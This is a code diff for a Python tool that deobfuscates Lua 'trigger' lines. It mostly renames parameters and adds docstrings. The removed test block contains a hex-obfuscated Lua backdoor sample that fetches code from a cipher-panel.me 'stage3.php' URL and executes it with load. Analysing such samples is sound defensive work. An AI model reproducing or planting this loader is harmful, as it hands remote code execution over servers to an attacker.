@@ -26,14 +26,6 @@ REGEX = [
 ]
 
 
-def is_int(_str: str) -> int:
-    try:
-        int(_str)
-    except ValueError:
-        return 1
-    return 0
-
-
 def grap(ls: list) -> str:
     """ Get Random And Pop (grap)
 
@@ -53,13 +45,15 @@ def grap(ls: list) -> str:
     return f
 
 
-def do_regex(_line: str, regex: str) -> list:
+def do_regex(line: str, regex: str) -> list:
     """ Do the regex template stuff
     
     Parameters
     ----------
+    line : str
+        Give the line to check to regex on
     regex : str
-        The regex to search for in _line
+        The regex to search for in line
 
     Returns
     -------
@@ -67,7 +61,7 @@ def do_regex(_line: str, regex: str) -> list:
         The list with the found groups
 
     """
-    return re.findall(regex, rf"{_line}", 
+    return re.findall(regex, rf"{line}", 
                       re.MULTILINE and re.IGNORECASE)
 
 
@@ -86,6 +80,19 @@ def do_list_addition(char_set: list) -> Generator:
 
 
 def get_table_contents(line: str) -> list:
+    """ Get the values inside the lua table
+
+    Parameters
+    ----------
+    line : str
+        Give the line to find the table and get it's content
+
+    Returns
+    -------
+    list : 
+        Return the list with found values
+
+    """
     _t = []
     
     for i in do_regex(line, TABLE_REGEX)[0][1].split(","):
@@ -94,7 +101,7 @@ def get_table_contents(line: str) -> list:
     return _t
 
 
-def de_obfs_code(_line: str, _ret: list) -> str:
+def de_obfs_code(line: str, ret: list) -> str:
     """ Trys to de De-Obfuscate the trigger line
     
     Returns
@@ -107,27 +114,27 @@ def de_obfs_code(_line: str, _ret: list) -> str:
     grap_names = VAR_NAMES
 
     for i in REGEX:
-        if x := do_regex(_line, i): 
+        if x := do_regex(line, i): 
             for j in do_list_addition(x):
                 var.extend(j)
     
     for i in var:
         name = grap(grap_names)
         names.append(name)
-        _line = _line.replace(i.strip(), name)
+        line = line.replace(i.strip(), name)
     
-    for v, t in de_obfs_char(_ret):
-        _line = _line.replace(t.strip('"'), v)
+    for v, t in de_obfs_char(ret):
+        line = line.replace(t.strip('"'), v)
     
 
-    table = get_table_contents(_line)
+    table = get_table_contents(line)
     t_re = rf"({names[0]}\[\d+\])"
-    omfg = set(do_regex(_line, t_re))
+    omfg = set(do_regex(line, t_re))
 
     for i, c in enumerate(sorted(omfg)):
-        _line = _line.replace(c, table[i])
+        line = line.replace(c, table[i])
 
-    return _line
+    return line
 
 
 def de_obfs_char(found: list) -> list: 
@@ -158,11 +165,21 @@ def de_obfs_char(found: list) -> list:
     return temp
 
 
-def de_obfs(_ret: list, _line: str) -> str:
-    return de_obfs_code(_line, _ret)
+def de_obfs(ret: list, line: str) -> str:
+    """ Just another way to entry the de obfuscation
 
+    Parameters
+    ----------
+    ret : list
+        Give the ret list
+    
+    line : str
+        Give the line to do stuff on
 
-if __name__ == "__main__":
-    ret = [('"\\x50\\x65\\x72\\x66\\x6f\\x72\\x6d\\x48\\x74\\x74\\x70\\x52\\x65\\x71\\x75\\x65\\x73\\x74"', '\\x74', '\\x', '74'), ('"\\x61\\x73\\x73\\x65\\x72\\x74"', '\\x74', '\\x', '74'), ('"\\x6c\\x6f\\x61\\x64"', '\\x64', '\\x', '64'), ('"\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x63\\x69\\x70\\x68\\x65\\x72\\x2d\\x70\\x61\\x6e\\x65\\x6c\\x2e\\x6d\\x65\\x2f\\x5f\\x69\\x2f\\x76\\x32\\x5f\\x2f\\x73\\x74\\x61\\x67\\x65\\x33\\x2e\\x70\\x68\\x70\\x3f\\x74\\x6f\\x3d\\x5a\\x43\\x73\\x4d\\x69\\x43"', '\\x43', '\\x', '43')]
-    line = r'local JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x5a\x43\x73\x4d\x69\x43", function (NITGVQwpvzdWIEsIKRRTcnvXYZGcHqhpHEraydIxOKENUiiZyoncOhpShzLIkVUQJOoeqm, sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij) if (sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[6] or sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij == JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[5]) then return end JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[2]](JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[4][JmylbmmspUKLAkUWaigEhsfNWKdEarImUOdkWewMJYNxNGWSTPkLdoyRCgrsjbtpJnOLTz[3]](sPvtXZWSYirHJOrnqlzRHrCGAQcqpPRVhXwKfAVQModEDycggXJcqvKuVUWZNSGJJohKij))() end)'
-    de_obfs(ret, line)
+    Returns
+    -------
+    str
+        Returns the de obfuscated code
+    """
+    return de_obfs_code(line, ret)
+
